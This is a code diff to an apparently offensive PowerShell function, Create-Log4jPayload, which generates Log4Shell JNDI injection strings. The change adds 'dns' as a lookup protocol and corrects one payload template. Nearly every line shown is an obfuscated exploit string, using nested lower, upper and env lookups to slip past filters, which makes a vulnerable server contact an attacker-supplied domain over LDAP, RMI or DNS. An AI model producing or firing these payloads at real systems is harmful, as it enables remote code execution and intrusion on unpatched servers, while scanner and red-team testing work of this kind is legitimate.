@@ -15,6 +15,7 @@ function Create-Log4jPayload
     $null = $Protocol.Rows.Add("ldap")
     $null = $Protocol.Rows.Add("`${lower:l}`${lower:d}a`${lower:p}")
     $null = $Protocol.Rows.Add("rmi")
+    $null = $Protocol.Rows.Add("dns")
 
     # Create list of presubdomain values for postion 1
     $MidPos1 = new-object System.Data.DataTable 
@@ -93,7 +94,7 @@ function Create-Log4jPayload
     $null = $PayloadVariations.Rows.Add("`${`${lower:j}`${lower:n}`${lower:d}i:`${lower:rmi}://$Domain/$word}")
     $null = $PayloadVariations.Rows.Add("`${jndi:`${lower:l}`${lower:d}a`${lower:p}://$Domain/$word}")
     $null = $PayloadVariations.Rows.Add("`${jndi:ldap:`${upper:/}`${upper:/}$Domain`:$port/$word}")
-    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain}")  
+    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain/$word}")  
 
     # Show variations
     $PayloadVariations
